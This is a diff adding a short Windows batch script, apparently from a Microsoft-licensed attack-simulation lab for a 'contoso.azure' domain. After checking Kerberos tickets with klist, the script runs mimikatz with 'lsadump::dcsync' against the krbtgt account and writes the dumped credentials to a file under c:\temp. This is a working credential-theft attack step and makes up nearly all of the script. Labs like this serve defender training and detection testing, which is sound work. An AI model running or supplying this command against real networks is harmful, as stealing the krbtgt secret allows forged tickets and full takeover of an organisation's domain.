@@ -1,0 +1,9 @@
+:: Copyright (c) Microsoft Corporation.  
+:: Licensed under the MIT license.
+
+:: prove we are NuckC still
+klist
+pause
+:: DCSync against krbtgt account
+c:\tools\mimikatz\x64\mimikatz.exe "lsadump::dcsync /domain:contoso.azure /user:krbtgt" "exit" >> c:\temp\contosodc_krbtgt-export.txt
+pause
